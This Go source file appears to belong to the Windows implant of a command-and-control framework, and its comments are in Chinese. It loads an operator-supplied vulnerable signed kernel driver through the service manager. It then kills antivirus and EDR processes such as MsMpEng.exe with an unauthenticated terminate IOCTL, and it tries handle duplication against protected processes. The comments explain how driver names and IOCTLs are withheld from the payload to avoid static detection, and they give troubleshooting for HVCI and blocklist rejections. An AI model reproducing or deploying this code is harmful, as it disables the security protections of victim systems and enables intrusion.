//go:build windows && !light

package main

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── 驱动加载 + 进程击杀（驱动由操作员提供）────────────────────────────
//
// v1.3.3 起**不内置任何驱动**：驱动名、服务名、设备路径、终止 IOCTL 全部由服务端
// 在任务数据里下发（服务端从操作员上传的 .sys 与其填写的档案读取）。这样载荷里
// 不会出现任何具体驱动名/IOCTL 明文 —— 之前内置驱动时，这些明文是最稳定的静态
// 查杀特征（AV/EDR 普遍按易受攻击驱动名与 IOCTL 做规则）。
//
// 典型驱动能力（由操作员自己的驱动决定）：
//   进程终止型：暴露一个无鉴权终止 IOCTL（METHOD_BUFFERED，入参首个 DWORD = PID），
//   驱动内部 PsLookupProcessByProcessId → ObOpenObjectByPointer(PROCESS_TERMINATE) →
//   ZwTerminateProcess，无需调用方权限，可终止普通杀软/EDR 进程（对 PPL 进程无效）。
//   PPL 场景需要自带"具备内核读写"的驱动，本文件不预置任何相关常量或偏移。
//
// drv_load：把操作员提供的（已签名但易受攻击的）驱动 .sys 写入系统驱动目录，
//   通过 SCM 创建并启动内核服务，返回设备路径。服务名/设备名一律由服务端下发，
//   **植入端不内置任何驱动名**（v1.3.3 起取消内置驱动：内置即等于把驱动名与 IOCTL
//   明文写进每个载荷，是最稳定的静态查杀特征）。
//   写入前会先尽力停止同名旧服务并删除旧文件（防止文件被占用）。
// drv_unload：停止并删除服务、删除驱动文件（服务名同样由服务端下发）。
// drv_kill：解析 {"pid":1234} 或 {"process_name":"MsMpEng.exe"}，
//   并**必须**带 {"device":"\\\\.\\yourdrv","ioctl":"0x??????"}（由服务端从操作员
//   填写的驱动档案下发），对每个 PID 调用该驱动的无鉴权终止 IOCTL 结束进程。
// ppl_kill：先直接 TerminateProcess；失败（PPL/自保护进程拒绝访问）时走
//   NtDuplicateObject 句柄窃取路线后终止（不依赖任何驱动）。

func handleDrvLoad(taskData string) (string, int32, string) {
	var req struct {
		DriverB64   string `json:"driver_b64"`
		ServiceName string `json:"service_name"`
		DeviceName  string `json:"device_name"`
	}
	if err := json.Unmarshal([]byte(taskData), &req); err != nil {
		return "", -1, fmt.Sprintf("parse driver data failed: %v", err)
	}
	if req.DriverB64 == "" {
		return "", -1, "missing driver_b64（请上传 .sys 驱动文件）"
	}
	svc := req.ServiceName
	if svc == "" {
		return "", -1, "missing service_name（服务名由操作员指定，植入端不内置任何驱动）"
	}
	driver, err := base64Decode(req.DriverB64)
	if err != nil {
		return "", -1, fmt.Sprintf("driver base64 decode failed: %v", err)
	}

	// 设备路径：已知驱动直接给标准名；否则按服务名猜测
	dev := `\\.\` + svc
	if req.DeviceName != "" {
		dev = `\\.\` + req.DeviceName
	}
	drvPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "drivers", svc+".sys")

	// 已加载则直接复用：避免重复写被内核映射锁定的 .sys（会报"文件被占用"）
	if deviceExists(dev) {
		return fmt.Sprintf("driver already loaded: service=%s, device=%s（无需重复加载）", svc, dev), 0, ""
	}

	// 尽力停止同名旧服务并删除旧文件（重试数次，应对杀软瞬时锁定）
	_ = stopKernelService(svc)
	for i := 0; i < 4; i++ {
		if err := os.Remove(drvPath); err == nil {
			break
		}
		time.Sleep(400 * time.Millisecond)
	}

	// 写入（重试几次，杀软可能瞬时占用）
	var werr error
	for i := 0; i < 4; i++ {
		werr = os.WriteFile(drvPath, driver, 0o644)
		if werr == nil {
			break
		}
		time.Sleep(400 * time.Millisecond)
	}
	if werr != nil {
		return "", -1, fmt.Sprintf("write driver failed: %v（文件被占用：旧驱动仍在运行？杀软自保护拦截？）", werr)
	}

	// SCM 创建 + 启动内核服务
	if err := startKernelService(svc, `\SystemRoot\System32\drivers\`+svc+".sys"); err != nil {
		_ = os.Remove(drvPath)
		return "", -1, fmt.Sprintf("start service failed: %v", err)
	}

	note := ""
	if !deviceExists(dev) {
		note = "（⚠️ 设备未检测到：驱动可能未真正运行、被 HVCI/杀软拦截或设备名不同）"
	}
	return fmt.Sprintf("driver loaded: service=%s, device=%s, path=%s %s", svc, dev, drvPath, note), 0, ""
}

func handleDrvUnload(taskData string) (string, int32, string) {
	var req struct {
		ServiceName string `json:"service_name"`
	}
	_ = json.Unmarshal([]byte(taskData), &req)
	svc := req.ServiceName
	if svc == "" {
		return "", -1, "missing service_name（服务名由操作员指定，植入端不内置任何驱动）"
	}
	if err := stopKernelService(svc); err != nil {
		return "", -1, fmt.Sprintf("stop service failed: %v", err)
	}
	_ = os.Remove(filepath.Join(os.Getenv("SystemRoot"), "System32", "drivers", svc+".sys"))
	return "driver unloaded: " + svc, 0, ""
}

// drvXferPid 通过驱动的无鉴权进程终止 IOCTL 结束指定 PID。
// device/ioctl 必须由服务端下发（服务端从操作员填写的驱动档案读取），
// 植入端不内置任何默认值；METHOD_BUFFERED 的入参就是 4 字节 PID，无出参。
func drvXferPid(device string, ioctl uint32, pid uint32) error {
	if device == "" || ioctl == 0 {
		return fmt.Errorf("驱动设备名或终止 IOCTL 为空：请先在界面加载你的 .sys 并填写设备名与 IOCTL")
	}

	procCreateFileW := resolveAPI("kernel32.dll", "CreateFileW")
	procDeviceIoControl := resolveAPI("kernel32.dll", "DeviceIoControl")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	pw, _ := windows.UTF16PtrFromString(device)
	// GENERIC_READ|GENERIC_WRITE(0xC0000000)、FILE_SHARE_READ|FILE_SHARE_WRITE(0x3)、OPEN_EXISTING(3)
	h, _, _ := procCreateFileW.Call(uintptr(unsafe.Pointer(pw)), 0xC0000000, 0x3, 0, 3, 0, 0)
	if h == ^uintptr(0) {
		return fmt.Errorf("打开 %s 失败：请先在界面加载你的 .sys 驱动（或确认驱动是否被系统/杀软拦截）", device)
	}
	defer procCloseHandle.Call(h)

	in := pid // 入参首个 DWORD = PID
	var ret uint32
	r1, _, _ := procDeviceIoControl.Call(h, uintptr(ioctl),
		uintptr(unsafe.Pointer(&in)), 4, 0, 0, uintptr(unsafe.Pointer(&ret)), 0)
	if r1 == 0 {
		return fmt.Errorf("DeviceIoControl(0x%06X, pid=%d) 失败：驱动拒绝终止（PPL 保护进程该 IOCTL 无效，或 PID 已退出）", ioctl, pid)
	}
	return nil
}

// handleDrvKill 解析 {"pid":1234} 或 {"process_name":"MsMpEng.exe"}，
// 对每个解析出的 PID 调用操作员提供的驱动的无鉴权终止 IOCTL。
// device/ioctl 由服务端从驱动档案下发（植入端不内置默认值）。
func handleDrvKill(taskData string) (string, int32, string) {
	var req struct {
		PID         uint32 `json:"pid"`
		ProcessName string `json:"process_name"`
		Device      string `json:"device"`
		IOCTL       uint32 `json:"ioctl"`
	}
	if err := json.Unmarshal([]byte(taskData), &req); err != nil {
		return "", -1, fmt.Sprintf("parse kill data failed: %v", err)
	}

	device := req.Device
	ioctl := req.IOCTL
	if device == "" || ioctl == 0 {
		return "", -1, "missing device/ioctl（驱动设备名与终止 IOCTL 由服务端从操作员档案下发；植入端不内置默认驱动）"
	}

	// 目标解析：pid 直接反查进程名；process_name 走 Toolhelp32 快照解析成 PID 列表后逐个尝试。
	type target struct {
		name string
		pid  uint32
	}
	var targets []target
	seen := map[uint32]bool{}
	if req.PID != 0 {
		seen[req.PID] = true
		targets = append(targets, target{name: processNameOfPID(req.PID), pid: req.PID})
	}
	if req.ProcessName != "" {
		for _, pid := range findProcessPIDs(req.ProcessName) {
			if seen[pid] {
				continue
			}
			seen[pid] = true
			targets = append(targets, target{name: req.ProcessName, pid: pid})
		}
	}
	if len(targets) == 0 {
		return "", -1, `missing pid/process_name（用法：{"pid":1234} 或 {"process_name":"MsMpEng.exe"}；进程名未匹配到运行中的进程）`
	}

	var b strings.Builder
	b.WriteString(fmt.Sprintf("== Driver Kill (IOCTL 0x%06X, device %s) ==\n", ioctl, device))
	for _, t := range targets {
		name := t.name
		if name == "" {
			name = "unknown"
		}
		if err := drvXferPid(device, ioctl, t.pid); err != nil {
			b.WriteString(fmt.Sprintf("[-] %v\n", err))
			continue
		}
		b.WriteString(fmt.Sprintf("[+] killed %d (%s) via driver IOCTL 0x%06X\n", t.pid, name, ioctl))
	}
	return b.String(), 0, ""
}

func handlePPLKill(taskData string) (string, int32, string) {
	var req struct {
		Processes []string `json:"processes"`
		PIDs      []uint32 `json:"pids"`
	}
	_ = json.Unmarshal([]byte(taskData), &req)
	names := req.Processes
	if len(names) == 0 && len(req.PIDs) == 0 {
		names = defaultAVProcesses
	}

	var b strings.Builder
	b.WriteString("== PPL Kill ==\n")
	b.WriteString("[*] PPL 击杀路线：句柄窃取（DuplicateHandle from 受保护进程）；该路线不依赖任何驱动（若已加载具备内核读写的驱动，可自行改用其 IOCTL 直接改 EPROCESS.Protection）\n")

	// 收集目标：(进程名, pid)。names 走 Toolhelp32 快照；pids 直接反查进程名。
	type target struct {
		name string
		pid  uint32
	}
	var targets []target
	seen := map[uint32]bool{}
	for _, n := range names {
		for _, pid := range findProcessPIDs(n) {
			if !seen[pid] {
				seen[pid] = true
				targets = append(targets, target{n, pid})
			}
		}
	}
	for _, pid := range req.PIDs {
		if seen[pid] {
			continue
		}
		seen[pid] = true
		targets = append(targets, target{processNameOfPID(pid), pid})
	}
	if len(targets) == 0 {
		return "", 0, "没有找到目标进程（未运行或名称不匹配）"
	}

	for _, t := range targets {
		if err := terminateByPID(t.pid); err == nil {
			b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated\n", t.name, t.pid))
			continue
		}
		// 直接终止失败（PPL/自保护进程拒绝访问）→ 句柄窃取路线
		// （NtDuplicateObject 从 SYSTEM 复制目标进程句柄后终止）
		if err := killPPLNoDriver(t.pid); err == nil {
			b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated via handle duplication\n", t.name, t.pid))
		} else {
			b.WriteString(fmt.Sprintf("[-] %s (pid=%d): 句柄窃取失败（受保护进程未持有可复制句柄；普通杀软/EDR 进程请改用驱动击杀 drv_kill，需自备驱动）: %v\n", t.name, t.pid, err))
		}
	}
	return b.String(), 0, ""
}

// ─── SCM 驱动服务 ────────────────────────────────────────────────

// 注意：本文件内所有面向操作员的诊断文案都必须写成**不含转义符的简单双引号
// 字面量**（用 " + " 拼接代替 \n），否则植入端字符串混淆器会跳过它们，把
// "ERROR_ACCESS_DISABLED_BY_POLICY"/"HVCI" 等字样明文留在载荷里（见
// internal/server/builder/implant_obfuscate.go：含转义的字符串不参与混淆）。

func startKernelService(name, binPath string) error {
	procOpenSCManagerW := resolveAPI("advapi32.dll", "OpenSCManagerW")
	procCreateServiceW := resolveAPI("advapi32.dll", "CreateServiceW")
	procOpenServiceW := resolveAPI("advapi32.dll", "OpenServiceW")
	procStartServiceW := resolveAPI("advapi32.dll", "StartServiceW")
	procCloseServiceHandle := resolveAPI("advapi32.dll", "CloseServiceHandle")

	hSCM, _, scmErr := procOpenSCManagerW.Call(0, 0, 0xF003F /*SC_MANAGER_ALL_ACCESS*/)
	if hSCM == 0 {
		return errors.New("打开服务控制管理器失败：" + winErrText(scmErr) +
			"；该操作需要管理员权限与高完整性级别，请先提权后再试")
	}
	defer procCloseServiceHandle.Call(hSCM)

	sn, _ := windows.UTF16PtrFromString(name)
	bp, _ := windows.UTF16PtrFromString(binPath)
	hSvc, _, createErr := procCreateServiceW.Call(
		hSCM, uintptr(unsafe.Pointer(sn)), uintptr(unsafe.Pointer(sn)),
		0xF01FF /*SERVICE_ALL_ACCESS*/, 0x1, /*SERVICE_KERNEL_DRIVER*/
		0x3 /*SERVICE_DEMAND_START*/, 0x1, /*SERVICE_ERROR_NORMAL*/
		uintptr(unsafe.Pointer(bp)), 0, 0, 0, 0, 0)
	if hSvc == 0 {
		// 服务已存在：尝试打开（1056/1073 = ERROR_SERVICE_EXISTS）
		hSvc, _, openErr := procOpenServiceW.Call(hSCM, uintptr(unsafe.Pointer(sn)), 0xF01FF)
		if hSvc == 0 {
			return errors.New("创建或打开驱动服务失败：" + winErrText(createErr) + " / " + winErrText(openErr) +
				"；服务名 " + name + "，驱动路径 " + binPath +
				"（权限不足、驱动文件不可读、或同名服务已被占用都会走到这里）")
		}
	}
	defer procCloseServiceHandle.Call(hSvc)

	r1, _, startErr := procStartServiceW.Call(hSvc, 0, 0)
	if r1 == 0 {
		// 具体 Win32 错误码决定排查方向，必须原样给出（此前只报"可能被 HVCI/黑名单拦截"，无从定位）。
		// 提示：1275 这类内核代码完整性拦截是**静默拒绝**，不会有任何杀软弹窗。
		return errors.New("启动驱动服务失败：" + winErrText(startErr) +
			"；排查：1275 = 被内核代码完整性策略拦截（HVCI 内存完整性 / 微软易受攻击驱动黑名单 / Smart App Control），" +
			"此类拦截无弹窗、属内核静默拒绝；577 = 驱动签名证书已被吊销；2 = 驱动文件未成功落盘；" +
			"5 = 权限不足；1053 = 驱动加载即崩溃（多为版本不匹配）；1058 = 服务被禁用；1073 = 服务已存在")
	}
	return nil
}

// winErrText 把 syscall.Errno 转成 "描述 (Win32 码 N)"，便于直接定位失败原因。
func winErrText(err error) string {
	if err == nil {
		return "无错误信息"
	}
	var errno syscall.Errno
	if errors.As(err, &errno) {
		switch errno {
		case 2:
			return "ERROR_FILE_NOT_FOUND：找不到驱动文件 (2)"
		case 5:
			return "ERROR_ACCESS_DENIED：权限不足 (5)"
		case 127:
			return "ERROR_PROC_NOT_FOUND：API 解析失败 (127)"
		case 577:
			return "ERROR_IMAGE_CERT_REVOKED：驱动签名证书已被吊销 (577)"
		case 1053:
			return "ERROR_SERVICE_REQUEST_TIMEOUT：服务启动超时（驱动加载即崩溃）(1053)"
		case 1056:
			return "ERROR_SERVICE_EXISTS：同名服务已存在 (1056)"
		case 1058:
			return "ERROR_SERVICE_DISABLED：服务被禁用 (1058)"
		case 1073:
			return "ERROR_SERVICE_EXISTS：同名服务已存在 (1073)"
		case 1275:
			return "ERROR_ACCESS_DISABLED_BY_POLICY：被策略或黑名单拦截（HVCI 内存完整性 / 微软易受攻击驱动黑名单 / Smart App Control）(1275)"
		}
		return fmt.Sprintf("Win32 错误 %d", uintptr(errno))
	}
	return err.Error()
}

func stopKernelService(name string) error {
	procOpenSCManagerW := resolveAPI("advapi32.dll", "OpenSCManagerW")
	procOpenServiceW := resolveAPI("advapi32.dll", "OpenServiceW")
	procControlService := resolveAPI("advapi32.dll", "ControlService")
	procDeleteService := resolveAPI("advapi32.dll", "DeleteService")
	procCloseServiceHandle := resolveAPI("advapi32.dll", "CloseServiceHandle")

	hSCM, _, _ := procOpenSCManagerW.Call(0, 0, 0xF003F)
	if hSCM == 0 {
		return errors.New("OpenSCManagerW failed")
	}
	defer procCloseServiceHandle.Call(hSCM)

	sn, _ := windows.UTF16PtrFromString(name)
	hSvc, _, _ := procOpenServiceW.Call(hSCM, uintptr(unsafe.Pointer(sn)), 0xF01FF)
	if hSvc == 0 {
		return nil // 服务不存在，视为已卸载
	}
	defer procCloseServiceHandle.Call(hSvc)

	var status [48]byte
	procControlService.Call(hSvc, 0x1 /*SERVICE_CONTROL_STOP*/, uintptr(unsafe.Pointer(&status[0])))
	procDeleteService.Call(hSvc)
	return nil
}

// ─── 进程终止 ────────────────────────────────────────────────────

// processEntry32W 对应 PROCESSENTRY32W（x64 布局）。
type processEntry32W struct {
	size            uint32
	usage           uint32
	processID       uint32
	defaultHeapID   uintptr
	moduleID        uint32
	threads         uint32
	parentProcessID uint32
	priClassBase    int32
	flags           uint32
	exeFile         [260]uint16
}

// findProcessPIDs 用 Toolhelp32 快照按镜像名查找 PID。
func findProcessPIDs(name string) []uint32 {
	procCreateToolhelp := resolveAPI("kernel32.dll", "CreateToolhelp32Snapshot")
	procProcess32FirstW := resolveAPI("kernel32.dll", "Process32FirstW")
	procProcess32NextW := resolveAPI("kernel32.dll", "Process32NextW")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	snap, _, _ := procCreateToolhelp.Call(0x2 /*TH32CS_SNAPPROCESS*/, 0)
	if snap == ^uintptr(0) || snap == 0 {
		return nil
	}
	defer procCloseHandle.Call(snap)

	entry := processEntry32W{}
	entry.size = uint32(unsafe.Sizeof(entry))
	var pids []uint32
	if r1, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry))); r1 != 0 {
		for {
			exe := windows.UTF16ToString(entry.exeFile[:])
			if strings.EqualFold(exe, name) {
				pids = append(pids, entry.processID)
			}
			if r2, _, _ := procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry))); r2 == 0 {
				break
			}
		}
	}
	return pids
}

// processNameOfPID 用 Toolhelp32 快照按 PID 反查进程名（找不到返回空串）。
func processNameOfPID(pid uint32) string {
	procCreateToolhelp := resolveAPI("kernel32.dll", "CreateToolhelp32Snapshot")
	procProcess32FirstW := resolveAPI("kernel32.dll", "Process32FirstW")
	procProcess32NextW := resolveAPI("kernel32.dll", "Process32NextW")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	snap, _, _ := procCreateToolhelp.Call(0x2, 0)
	if snap == ^uintptr(0) || snap == 0 {
		return ""
	}
	defer procCloseHandle.Call(snap)

	entry := processEntry32W{}
	entry.size = uint32(unsafe.Sizeof(entry))
	if r1, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry))); r1 != 0 {
		for {
			if entry.processID == pid {
				return windows.UTF16ToString(entry.exeFile[:])
			}
			if r2, _, _ := procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry))); r2 == 0 {
				break
			}
		}
	}
	return ""
}

func terminateByPID(pid uint32) error {
	procOpenProcess := resolveAPI("kernel32.dll", "OpenProcess")
	procTerminateProcess := resolveAPI("kernel32.dll", "TerminateProcess")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	// PROCESS_TERMINATE(0x1) | PROCESS_QUERY_LIMITED_INFORMATION(0x1000)
	hProc, _, _ := procOpenProcess.Call(0x1001, 0, uintptr(pid))
	if hProc == 0 {
		return errors.New("OpenProcess failed (权限不足或 PPL)")
	}
	defer procCloseHandle.Call(hProc)
	r1, _, _ := procTerminateProcess.Call(hProc, 1)
	if r1 == 0 {
		return errors.New("TerminateProcess failed")
	}
	return nil
}

// ─── 驱动 / 进程通用 helper ──────────────────────────────────────

// deviceExists 检查设备是否存在（用于判断驱动是否已加载）。
func deviceExists(path string) bool {
	proc := resolveAPI("kernel32.dll", "CreateFileW")
	pw, _ := windows.UTF16PtrFromString(path)
	h, _, _ := proc.Call(uintptr(unsafe.Pointer(pw)), 0x80000000, 0x7, 0, 3, 0, 0)
	if h == ^uintptr(0) {
		return false
	}
	resolveAPI("kernel32.dll", "CloseHandle").Call(h)
	return true
}

func base64Decode(s string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(s)
}
